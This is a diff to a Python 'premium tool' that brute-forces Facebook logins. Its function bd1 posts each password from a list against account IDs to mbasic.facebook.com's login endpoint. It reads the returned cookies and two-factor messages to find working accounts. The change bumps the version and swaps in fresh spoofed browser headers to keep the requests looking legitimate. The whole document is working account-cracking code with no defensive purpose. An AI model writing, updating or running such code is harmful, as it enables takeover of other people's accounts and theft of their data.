@@ -124,7 +124,7 @@ logo=("""\033[1;37m
  |___|___/\__,_|\__,_|\___|
 \033[1;37m-----------------------------------------------
 \033[1;37m AUTHOR    : ISAAC
-\033[1;37m VERSION    : 0.1
+\033[1;37m VERSION    : 0.2
 \033[1;37m═══════════════════════════════════════════════  
 \033[92;1m                 PREMIUM TOOL \033[1;37m√ 
 \033[1;37m═══════════════════════════════════════════════""")   
@@ -583,37 +583,22 @@ def bd1(ids,passlist):
             "email":ids,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
-            "method": 'GET',
-            "scheme": 'https',
-            'authority': 'developer.facebook.com',
-            'x-fb-rlafr': '0',
-            'access-control-allow-origin': '*',
-            'facebook-api-version': 'v17.0',
-            'strict-transport-security': 'max-age=15552000',
-            'pragma': 'no-cache',
-            'cache-control': 'private, no-cache, no-store, must-revalidate',
-            'x-fb-request-id': 'A5ZKh_85GaagpB8XJbwc9jD',
-            'x-fb-trace-id': 'DKv719n6x5A',
-            'x-fb-rev': '1007660106',
-            'x-fb-debug': '0Wgri/aCTmjxPumj0+CG/zZiMXJ7STJoeBV090VKxpelr/8ZFdv2Yhf8eVXye88jFgf4VfRJ/fAhAmK5VclVPQ==',
+            header_freefb = {
+            'authority': 'mbasic.facebook.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
-            'origin': 'https://mbasic.facebook.com',
-            'referer': 'https://mbasic.facebook.com/',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"13.0.0"',
+            'dpr': '1.7000000476837158',
+            'sec-ch-ua': '"Google Chrome";v="114", "Chromium";v="114", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Linux"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': pro}
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+            'viewport-width': '980',}
             twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
